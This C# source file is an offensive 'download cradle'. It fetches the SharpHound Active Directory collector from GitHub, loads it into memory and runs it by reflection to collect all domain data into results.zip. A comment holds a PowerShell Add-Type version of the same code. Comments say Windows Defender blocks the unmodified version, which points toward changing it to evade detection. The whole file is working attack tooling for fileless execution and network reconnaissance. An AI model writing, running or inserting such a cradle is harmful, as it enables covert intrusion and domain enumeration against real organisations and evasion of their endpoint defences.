using System;
using System.Net;
using System.Reflection;

namespace DotNetDownloadCradle
{

    /*
     Alternatively, load via PowerShell Add-Type, demonstrated below

---- Start of Code ----

$code = @"

using System;
using System.Net;
using System.Reflection;

    public class Program
    {
        public static void Main()
        {
            WebClient myWebClient = new WebClient();
            byte[] data = myWebClient.DownloadData("https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe");
            Assembly assem = Assembly.Load(data);
            Type myClass = assem.GetType("Sharphound.Program");
            MethodInfo method = myClass.GetMethod("<Main>", BindingFlags.Static | BindingFlags.NonPublic);
            method.Invoke(0, new object[] { new String[] { "-c", "all", "--zipFilename", "results.zip"} });
        }
    }
"@

Add-Type $code 

[Program]::Main()

---- End of Code ----
     */


    /*
     * Download .NET assembly and load into memory and execute via reflection techniques. 
     * Unmodified, this runs SharpHound collector - which will be blocked by Windows Defender Real-time protection
     * 
     */
    class Program
    {
        public Program()
        {
            WebClient myWebClient = new WebClient();
            byte[] data = myWebClient.DownloadData("https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe");
            Assembly assem = Assembly.Load(data);
            Type myClass = assem.GetType("Sharphound.Program");
            MethodInfo method = myClass.GetMethod("<Main>", BindingFlags.Static | BindingFlags.NonPublic);
            method.Invoke(0, new object[] { new String[] { "-c", "all", "--zipFilename", "results.zip" } });
        }
        static void Main(string[] args)
        {
            new Program();
        }
    }
}
